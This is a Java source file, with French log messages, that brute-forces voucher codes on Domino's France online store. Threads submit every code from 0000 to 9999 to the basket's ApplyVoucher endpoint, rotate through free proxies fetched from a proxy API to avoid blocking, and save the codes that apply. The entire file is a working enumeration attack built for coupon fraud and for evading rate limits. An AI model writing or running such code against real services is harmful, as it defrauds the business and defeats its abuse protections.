import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
import java.text.DecimalFormat;

import javax.net.ssl.HttpsURLConnection;

import org.json.JSONException;
import org.json.JSONObject;
import org.jsoup.Jsoup;

public class SessionTh extends Thread {
    private String cookie;
    private Proxy proxy;

    // private final Object lock = new Object();

    public SessionTh() {
	cookie = Main.getCookie();
    }

    public static Proxy getNewProxy() {
	Proxy res = null;

	try {
	    // https://commande.dominos.fr/eStore/ GET
	    URL obj = new URL(
		    "https://gimmeproxy.com/api/getProxy?get=true&post=true&cookies=true&user-agent=true&supportsHttps=true&maxCheckPeriod=500%22");
	    HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();

	    // add reuqest header
	    con.setRequestMethod("GET");
	    // con.setRequestProperty("Cookie", "ASP.NET_SessionId="+cookie);

	    con.getResponseCode();

	    BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream(), "UTF-8"));
	    StringBuffer response = new StringBuffer();

	    String inputLine;
	    while ((inputLine = in.readLine()) != null) {
		response.append(inputLine);
	    }
	    in.close();

	    JSONObject json = new JSONObject(response.toString());

	    if (json.has("error")) {
		System.out.println("Pas de proxy dispo. Attente 30s");
		try {
		    Thread.sleep(30000);
		} catch (InterruptedException e) {
		    // TODO Auto-generated catch block
		    e.printStackTrace();
		}
	    }

	    if (json.getString("protocol").equals("http")) {
		res = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(json.getString("ip"), json.getInt("port")));
	    } else {
		res = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress(json.getString("ip"), json.getInt("port")));
	    }

	    System.out.println(res);

	} catch (IOException e) {
	    // TODO Auto-generated catch block
	    e.printStackTrace();
	}

	return res;
    }

    public void run() {
	while (Main.codeEnCours <= 9999) {
	    tryCode();
	    try {
		sleep(200);
	    } catch (InterruptedException e) {
		e.printStackTrace();
	    }
	}
    }

    public void tryCode() {
	try {

	    if (this.proxy == null) {
		this.proxy = getNewProxy();
	    } else {
		URL url = new URL("https://commande.dominos.fr/eStore/fr/Basket/ApplyVoucher");
		HttpsURLConnection con = (HttpsURLConnection) url.openConnection(proxy);

		// Add request header
		con.setRequestMethod("POST");
		con.setRequestProperty("Cookie", "ASP.NET_SessionId=" + cookie);
		String urlParameters = "voucherCode=" + Main.format(Main.codeEnCours) + "&addFromVoucherBox=true";
		// Send post request
		con.setDoOutput(true);
		con.connect();
		DataOutputStream wr = new DataOutputStream(con.getOutputStream());
		wr.writeBytes(urlParameters);
		wr.flush();
		wr.close();
		int responseCode = con.getResponseCode();
		if (responseCode == 200) {
		    Main.codeEnCours++;
		    BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream(), "UTF-8"));
		    String inputLine;
		    StringBuffer response = new StringBuffer();
		    while ((inputLine = in.readLine()) != null) {
			response.append(inputLine);
		    }
		    in.close();
		    JSONObject json = new JSONObject(response.toString());
		    if (json.isNull("Messages")) {
			url = new URL("https://commande.dominos.fr/estore/fr/Basket/GetBasketView");
			con = (HttpsURLConnection) url.openConnection();
			// add request header
			con.setRequestMethod("GET");
			con.setRequestProperty("Cookie", "ASP.NET_SessionId=" + cookie);
			con.getResponseCode();
			in = new BufferedReader(new InputStreamReader(con.getInputStream(), "UTF-8"));
			StringBuffer response2 = new StringBuffer();
			while ((inputLine = in.readLine()) != null) {
			    response2.append(inputLine);
			}
			in.close();
			String st = Jsoup.parse(response2.toString()).getElementsByClass("at-description").text();
			if (st.isEmpty())
			    st = "Erreur panier";
			Main.saveResponse(Main.codeEnCours, "okCode;\"" + st + "\"");
			cookie = Main.getCookie();
		    } else {
			try {
			    String text = "invalide";
			    if (!json.isNull("ResponseMessages")) {
				text += ";" + json.getJSONArray("ResponseMessages").getJSONObject(0).getString("Code");
				DecimalFormat format = new DecimalFormat("0000");
				System.out.println(format.format(Main.codeEnCours) + ";" + text);
			    }
			    System.out.println(proxy.address());
			    System.out.println(Main.codeEnCours);
			} catch (JSONException e2) {
			    cookie = Main.getCookie();
			    tryCode();
			}
		    }

		} else {
		    cookie = Main.getCookie();
		    tryCode();
		}
		con.disconnect();
	    }
	} catch (IOException e) {
	    System.out.println("Connexion perdue ou refusee : " + proxy);
	}
    }
}
